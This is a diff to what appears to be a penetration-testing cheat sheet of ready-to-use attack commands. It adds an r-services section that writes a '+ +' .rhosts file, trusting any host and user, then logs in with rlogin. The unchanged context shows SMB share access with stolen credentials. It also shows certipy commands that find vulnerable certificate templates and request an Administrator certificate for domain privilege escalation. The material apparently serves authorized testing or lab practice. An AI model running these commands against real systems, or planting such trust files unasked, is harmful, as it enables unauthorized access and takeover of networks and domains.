@@ -366,6 +366,10 @@ impacket-smbclient $DOM/'$USERNAME':'$PASSWORD'@$TARGET
 shares
 use
 
+[*] (512-514) RSERVICES
+echo '+ +' > .rhosts; chmod 600 .rhosts
+rlogin $USERNAME@$TARGET
+
 [*] ADCS
 certipy-ad find -u '$USERNAME' -p '$PASSWORD' -dc-ip $TARGET -vulnerable -enabled -stdout
 certipy-ad req -target '$DC' -ca '$CA' -upn 'Administrator' -template 'RetroClients' -key-size '4096' -k -no-pass
